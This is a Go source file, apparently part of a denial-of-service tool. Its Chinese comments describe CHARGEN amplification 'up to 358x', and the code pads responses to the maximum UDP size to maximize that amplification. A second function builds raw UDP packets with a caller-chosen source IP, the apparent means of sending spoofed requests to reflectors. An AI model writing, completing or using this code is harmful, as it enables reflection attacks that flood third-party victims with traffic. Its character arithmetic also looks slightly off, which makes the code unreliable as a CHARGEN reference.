package protocol

import (
	"bytes"
)

// CHARGENResponseBuffer 生成CHARGEN协议响应
// 放大倍数高达358倍
func CHARGENResponseBuffer() []byte {
	// CHARGEN协议很简单，就是返回ASCII字符的流
	var buf bytes.Buffer
	
	// CHARGEN响应的标准模式是循环的ASCII字符
	// 标准的响应是1472字节（最大UDP包大小），以实现最大放大
	// 每行72个字符加上换行符 = 73字节/行
	
	// 计算需要多少行才能达到最大大小
	linesNeeded := 1472 / 73  // 约20行
	
	// 按照标准CHARGEN格式生成数据
	startChar := 32 // 起始于ASCII空格
	
	// 生成多行响应
	for line := 0; line < linesNeeded; line++ {
		// CHARGEN的标准模式是每行旋转一个字符
		currentChar := (startChar + line) % 95
		
		// 每行生成72个字符
		for i := 0; i < 72; i++ {
			// 确保我们只使用可打印字符 (ASCII 32-126)
			charToWrite := (currentChar + i) % 95 + 32
			buf.WriteByte(byte(charToWrite))
		}
		
		// 每行结束添加换行符
		buf.WriteByte('\n')
	}
	
	// 几乎填满UDP包以最大化放大
	remainingBytes := 1472 - buf.Len()
	if remainingBytes > 0 {
		padding := bytes.Repeat([]byte{'X'}, remainingBytes)
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

func ChargenPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, []byte{0x00})
}